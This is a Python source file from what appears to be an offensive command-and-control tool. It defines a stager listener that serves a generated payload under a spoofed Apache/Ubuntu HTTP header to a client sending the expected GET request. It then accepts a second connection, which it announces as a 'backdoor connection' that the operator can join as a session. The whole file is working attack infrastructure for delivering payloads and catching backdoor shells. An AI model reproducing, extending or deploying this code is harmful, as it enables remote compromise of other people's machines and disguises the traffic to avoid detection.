from core.Generator                     import Generator

import core.TextAssets

import socket
import threading
import time

# This will be our dynamic listener / stager that will accept
# 1 incoming connection. If the connection is mishandled, no
# payload is sent. If correct, the payload is sent, and the
# connection is saved.
class StagerListener:
    client                              = None

    def __init__(self, settings):
        self.generator                  = Generator
        self.settings                   = settings
        self.server_listener            = None
        self.server_shutdown            = threading.Event()
        
    def send_stage(self):
        http_response                   = "HTTP/1.0 200 OK"
        http_server                     = "Server: Apache/2.4.41 (Ubuntu)"
        date_now                        = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
        http_date                       = "Date: " + date_now
        http_content_type               = "Content-Type: application/octet-stream"

        generator                       = self.generator(self.settings)
        payload                         = generator.generate_payload()
        payload_length                  = str(len(payload))

        content_length                  = "Content-Length: " + payload_length
        last_modified                   = "Last-Modified: " + date_now
        last_line                       = "\r\n\r\n"

        http_header                     = [
            http_response,
            http_server,
            http_date,
            http_content_type,
            content_length,
            last_modified,
            last_line
        ]

        http_header                     = "\r\n".join(http_header)
        full_response                   = http_header + payload

        self.client.send(full_response.encode())

    def verify_stage(self):
        correct_request                 = f"GET /{self.settings.payload_name} HTTP/1.1"
        bytes_received                  = self.client.recv(1024).decode()
        bytes_received                  = bytes_received.split("\r")[0]

        info                            = core.TextAssets.plus
        exclam                          = core.TextAssets.exclam
        prompt                          = core.TextAssets.prompt

        if bytes_received == correct_request:
            print(f"\n{info} Sending stage ...")
            self.send_stage()
            StagerListener.client.close()

            return True

        else:
            print(f"\n{exclam} Incorrect connection type. Shutting down server.\n", end=prompt, flush=True)
            StagerListener.client.close()
            self.shutdown_server()

    def listen(self):
        info                            = core.TextAssets.plus
        exclam                          = core.TextAssets.exclam
        prompt                          = core.TextAssets.prompt

        try:
            self.server_listener.bind(self.settings.network_listener_address)
            self.server_listener.listen(1)

            StagerListener.client, addr = self.server_listener.accept()

            if not self.verify_stage():
                return

            StagerListener.client, addr = self.server_listener.accept()

            print(f"{info} Backdoor connection received. Type 'join' to join session.\n", end=prompt, flush=True)
            self.server_listener.close()

            while True:
                continue

        except:
            print(f"{exclam} Stager failed to bind to address.")
            return
    
    def startup_server(self):
        brown                           = core.TextAssets.brown

        if self.server_listener:
            self.shutdown_server()
        self.server_listener            = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_thread              = threading.Thread(target=self.listen)
        self.server_thread.daemon       = True
        self.server_thread.start()

        port_address                    = "[" + str(self.settings.network_listener_address[1]) + "]"
        print(f"Stager Listener {brown(port_address)}")
        
    def shutdown_server(self):
        self.server_shutdown.set()

        if StagerListener.client:
            StagerListener.client.close()
            StagerListener.client       = None

        if self.server_listener:
            self.server_listener.close()

        self.server_listener = None